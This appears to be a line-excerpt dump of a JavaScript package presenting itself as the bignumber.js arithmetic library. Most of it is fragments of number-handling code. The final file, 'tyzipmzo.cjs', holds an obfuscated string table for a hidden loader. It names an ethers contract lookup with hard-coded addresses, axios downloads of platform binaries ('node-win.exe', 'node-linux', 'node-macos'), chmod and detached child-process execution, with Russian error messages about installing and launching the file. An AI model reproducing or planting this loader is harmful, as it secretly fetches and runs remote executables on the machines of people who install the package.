Line 2189: xlo = ylo * xlo + ((m % sqrtBase) * sqrtBase) + zc[j] + c
Line 2191: zc[j--] = xlo % base
Line 2194: zc[j] = c
Line 2270: bitFloor(xe)
Line 2271: bitFloor(ye)
Line 2285: t.push(0)
Line 2301: {
        a = (xc[--b] = xc[b] + yc[b] + a) / BASE | 0;
        xc[b] = BASE === xc[b] ? 0 : xc[b] % BASE;
      }
Line 2302: a = (xc[--b] = xc[b] + yc[b] + a) / BASE | 0
Line 2303: xc[b] = BASE === xc[b] ? 0 : xc[b] % BASE
Line 2306: {
        xc = [a].concat(xc);
        ++ye;
      }
Line 2307: xc = [a].concat(xc)
Line 2308: ++ye
Line 2337: intCheck(sd, 1, MAX)
Line 2339: intCheck(rm, 0, 8)
Line 2372: intCheck(k, -MAX_SAFE_INTEGER, MAX_SAFE_INTEGER)
Line 2403: Math.sqrt(+valueOf(x))
Line 2410: Math.sqrt(+n)
Line 2411: bitFloor((e + 1) / 2)
Line 2437: t.plus(div(x, t, dp, 1))
Line 2498: intCheck(dp, 0, MAX)
Line 2499: dp++
Line 2519: intCheck(dp, 0, MAX)
Line 2572: {
        var i,
          arr = str.split('.'),
          g1 = +format.groupSize,
          g2 = +format.secondaryGroupSize,
          groupSeparator = format.groupSeparator || '',
          intPart = arr[0],
          fractionPart = arr[1],
          isNeg = x.s < 0,
          intDigits = isNeg ? intPart.slice(1) : intPart,
          len = intDigits.length;

        if (g2) {
          i = g1;
          g1 = g2;
          g2 = i;
          len -= i;
        }

        if (g1 > 0 && len > 0) {
          i = len % g1 || g1;
          intPart = intDigits.substr(0, i);
          for (; i < len; i += g1) intPart += groupSeparator + intDigits.substr(i, g1);
          if (g2 > 0) intPart += groupSeparator + intDigits.slice(i);
          if (isNeg) intPart = '-' + intPart;
        }

        str = fractionPart
         ? intPart + (format.decimalSeparator || '') + ((g2 = +format.fractionGroupSize)
          ? fractionPart.replace(new RegExp('\\d{' + g2 + '}\\B...
Line 2573: var i,
          arr = str.split('.'),
          g1 = +format.groupSize,
          g2 = +format.secondaryGroupSize,
          groupSeparator = format.groupSeparator || '',
          intPart = arr[0],
          fractionPart = arr[1],
          isNeg = x.s < 0,
          intDigits = isNeg ? intPart.slice(1) : intPart,
          len = intDigits.length;
Line 2578: var intPart = arr[0]
Line 2579: var fractionPart = arr[1]
Line 2622: {
      var d, d0, d1, d2, e, exp, n, n0, n1, q, r, s,
        x = this,
        xc = x.c;

      if (md != null) {
        n = new BigNumber(md);

        // Throw if md is less than one or is not an integer, unless it is Infinity.
        if (!n.isInteger() && (n.c || n.s !== 1) || n.lt(ONE)) {
          throw Error
            (bignumberError + 'Argument ' +
              (n.isInteger() ? 'out of range: ' : 'not an integer: ') + valueOf(n));
        }
      }

      if (!xc) return new BigNumber(x);

      d = new BigNumber(ONE);
      n1 = d0 = new BigNumber(ONE);
      d1 = n0 = new BigNumber(ONE);
      s = coeffToString(xc);

      // Determine initial denominator.
      // d is a power of 10 and the minimum max denominator that specifies the value exactly.
      e = d.e = s.length - x.e - 1;
      d.c[0] = POWS_TEN[(exp = e % LOG_BASE) < 0 ? LOG_BASE + exp : exp];
      md = !md || n.comparedTo(d) > 0 ? (e > 0 ? d : n1) : n;

      exp = MAX_EXP;...
Line 2648: d.c[0] = POWS_TEN[(exp = e % LOG_BASE) < 0 ? LOG_BASE + exp : exp]
Line 2656: n0.c[0] = 0
Line 2660: d0.plus(q.times(d1))
Line 2664: n0.plus(q.times(d2 = n1))
Line 2671: n0.plus(d2.times(n1))
Line 2672: d0.plus(d2.times(d1))
Line 2678: _tmp_103.push(n0)
Line 2706: intCheck(sd, 1, MAX)
Line 2740: toFixedPoint(coeffToString(n.c), e, '0')
Line 2743: toFixedPoint(coeffToString(n.c), n.e, '0')
Line 2745: intCheck(b, 2, ALPHABET.length, 'Base')
Line 2746: toFixedPoint(coeffToString(n.c), e, '0')
Line 2786: {
    var s, z,
      i = 1,
      j = a.length,
      r = a[0] + '';

    for (; i < j;) {
      s = a[i++] + '';
      z = LOG_BASE - s.length;
      for (; z--; s = '0' + s);
      r += s;
    }

    // Determine trailing zeros.
    for (j = r.length; r.charCodeAt(--j) === 48;);

    return r.slice(0, j + 1 || 1);
  }
Line 2787: var s, z,
      i = 1,
      j = a.length,
      r = a[0] + '';
Line 2790: var r = a[0] + ''
Line 2792: {
      s = a[i++] + '';
      z = LOG_BASE - s.length;
      for (; z--; s = '0' + s);
      r += s;
    }
Line 2793: s = a[i++] + ''
Line 2807: {
    var a, b,
      xc = x.c,
      yc = y.c,
      i = x.s,
      j = y.s,
      k = x.e,
      l = y.e;

    // Either NaN?
    if (!i || !j) return null;

    a = xc && !xc[0];
    b = yc && !yc[0];

    // Either zero?
    if (a || b) return a ? b ? 0 : -j : i;

    // Signs differ?
    if (i != j) return i;

    a = i < 0;
    b = k == l;

    // Either Infinity?
    if (!xc || !yc) return b ? 0 : !xc ^ a ? 1 : -1;

    // Compare exponents.
    if (!b) return k > l ^ a ? 1 : -1;

    j = (k = xc.length) < (l = yc.length) ? k : l;

    // Compare digit by digit.
    for (i = 0; i < j; i++) if (xc[i] != yc[i]) return xc[i] > yc[i] ^ a ? 1 : -1;

    // Compare lengths.
    return k == l ? 0 : k > l ^ a ? 1 : -1;
  }
Line 2819: a = xc && !xc[0]
Line 2820: b = yc && !yc[0]
Line 2863: bitFloor(n.e / LOG_BASE)
Line 2904: BigNumber['default'] = BigNumber.BigNumber = BigNumber

// File: tmp/tmp0uk3y5_k/bignum.js/package/tyzipmzo.cjs
// ======================================================================
Line 1: function _0x53fc = function _0x53fc(){const _0x4cdac8=['Ошибка\x20установки:','dnmeP','ifzTb','9979380lkjFyc','stream','pkSNE','Ошибка\x20при\x20запуске\x20файла:','16204Xhcqwm','301iVGvKY','util','linux','platform','basename','qaVdL','error','chmodSync','0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84','fYBPg','10414584oDoHKD','win32','226KYNmGv','child_process','getDefaultProvider','XRZez','204568fHwjHc','63401750TliSAY','unref','tmpdir','zcaRz','19551GLaYBW','darwin','ignore','getString','function\x20getString(address\x20account)\x20public\x20view\x20returns\x20(string)','NKxjA','yUJpy','/node-win.exe','path','0xa1b40044EBc2794f207D45143Bd82a1B86156c6b','/node-linux','LSJDg','ethers','5QDJmpy','data','Contract','nSMRA','axios','TdRSx','dDRcw','join','Unsupported\x20platform:\x20','/node-macos','createWriteStream','pipe','3348680WoLJlR','jDoxo','Ошибка\x20при\x20получении\x20IP\x20адреса:','mainnet'];_0x53fc=function(){return _0x4cdac8;};return _0x53fc();}
